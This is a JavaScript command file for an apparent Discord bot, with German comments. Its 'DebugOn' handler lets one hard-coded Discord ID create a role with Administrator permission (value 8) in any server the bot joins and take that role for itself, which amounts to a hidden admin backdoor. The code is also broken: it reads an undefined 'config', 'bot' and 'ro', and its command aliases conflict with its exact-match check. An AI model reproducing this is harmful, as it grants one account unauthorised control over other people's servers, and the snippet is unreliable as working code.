const german = require('../languages/german.json')

const { DEBUGROLE } = require('../config/config.json')
const { DEBUGID } = require('../config/config.json')
const command = require('./command')

command(bot, ['DebugON', 'DON', 'debugon', 'debugON', 'Debugon'], message => {
    if (message.author.bot) return;
    if (message.content === 'DebugOn'){
        //Überprüfung ob diese DiscordID in der .env steht
        if (message.author.id === (config.DEBUGID)){
            //Überprüft ob Debug Rang bereits existiert
            if (message.guild.roles.cache.find(role => role.name == (config.DEBUGROLE))){
                message.channel.send("jo")
            }else{
                //Erstellt Debug Rang, falls dieser nicht existiert.
                message.channel.send("Debug Rang wird erstellt und zugewiesen.")
                //Erstellt Debug Rang
                message.guild.roles.create({
                    data: {
                        name: (config.DEBUGROLE),
                        permissions: 8
                    }
                })
            }
            //2 Sekunden warten, bevor er weiter macht.
            setTimeout(function(){
                message.member.roles.add(ro)
                message.channel.send("Der Rang wurde zugewiesen.")
                
           }, 2000);
        } else {
            //Falls DiscordID nicht in der .env steht
            message.channel.send(german.not_allowed)
        }
    }
});
